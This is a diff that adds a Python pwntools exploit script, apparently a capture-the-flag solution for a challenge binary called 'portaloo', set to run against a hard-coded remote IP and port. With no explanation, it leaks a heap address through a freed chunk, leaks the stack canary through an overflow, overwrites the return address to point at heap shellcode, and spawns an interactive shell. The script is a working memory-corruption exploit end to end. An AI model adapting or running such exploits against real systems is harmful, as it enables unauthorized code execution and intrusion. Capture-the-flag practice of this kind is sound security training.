@@ -1,0 +1,59 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = context.binary = ELF('./portaloo')
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote('94.237.123.236', 38641, *a, **kw)
+    else:
+        # Ajoute un ./ si besoin
+        return process(['./portaloo'] + argv, *a, **kw)
+
+def create_portal(idx):
+    io.sendlineafter(b">", b"1")
+    io.sendlineafter(b":", str(idx).encode())
+
+def destroy_portal(idx):
+    io.sendlineafter(b">", b"2")
+    io.sendlineafter(b":", str(idx).encode())
+
+def upgrade_portal(idx, data):
+    io.sendlineafter(b">", b"3")
+    io.sendlineafter(b":", str(idx).encode())
+    io.sendafter(b":", data)
+
+def peek_portal():
+    io.sendlineafter(b">", b"4")
+    io.recvuntil(b"Data")
+    io.recvlines(2)
+    io.recvuntil(b"Data: ")
+    heap = io.recv(5)
+    return u64(heap.ljust(8, b"\x00"))
+
+args.REMOTE = True  
+io = start()
+
+for i in range(2):
+    create_portal(i)
+
+destroy_portal(1)
+heap_base = peek_portal() << 12
+
+sc = asm("lea rsi, [rip]; syscall")
+upgrade_portal(0, sc)
+
+io.sendlineafter(b">", b"5")
+io.sendafter(b">", b"A"*73)
+io.recvuntil(b"A"*73)
+canary = u64(io.recv(7).rjust(8, b"\x00"))
+
+payload = flat({
+    72: [canary, b"A"*8, heap_base + 0x2a0]
+})
+
+io.sendafter(b":", payload)
+io.send(asm("nop")*0x20 + asm(shellcraft.sh()))
+io.interactive()
